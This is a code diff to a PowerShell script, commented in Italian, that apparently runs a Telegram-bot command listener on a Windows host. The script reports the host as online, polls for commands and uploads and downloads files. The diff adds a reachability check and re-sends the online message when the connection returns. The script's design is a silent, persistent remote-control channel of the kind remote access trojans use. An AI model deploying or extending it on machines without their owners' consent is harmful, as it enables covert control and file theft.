@@ -21,6 +21,7 @@ $api_send_messages  = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_toke
 $api_get_file       = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
 $api_download_file  = 'https://api.telegram.org/file/bot{0}/' -f $api_token
 $api_upload_file    = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}' -f $api_token, $telegram_id
+$api_get_me         = 'https://api.telegram.org/bot{0}/getMe' -f $api_token
 
 # Imposta la variabile di preferenza globale $ProgressPreference su 'SilentlyContinue'
 $Global:ProgressPreference = 'SilentlyContinue'
@@ -233,6 +234,16 @@ function CheckRequiredParameters($CommandString)
 }
 
 
+# Funzione per controllare la raggiungibilità del sito
+function TestTelegramAPI {
+    try { 
+        Invoke-RestMethod -Uri $api_get_me -TimeoutSec 10 -ErrorAction Stop | Out-Null
+        return $true 
+    } 
+    catch { return $false }
+}
+
+
 # Funzione principale per ascoltare i comandi da Telegram
 function CommandListener
 {
@@ -240,10 +251,19 @@ function CommandListener
     $hostia = $env:COMPUTERNAME
     $hostname = $hostia
 
-    try { SendMessage "Computer online!" } catch { "" }
+    # Inizializza lo stato di raggiungibilità
+    $PreviousStatus = $null
 
-    while ($true) {        
+    while ($true) {
         try {
+            # Verifica connettività a Telegram
+            $CurrentStatus = TestTelegramAPI
+
+            if ($CurrentStatus -ne $PreviousStatus) {
+                if ($CurrentStatus) { SendMessage "Computer online!" }
+                $PreviousStatus = $CurrentStatus
+            }
+
             # Ottiene i nuovi messaggi da Telegram
             $message = Invoke-RestMethod -Method Get -Uri $api_get_updates -WebSession $session
 
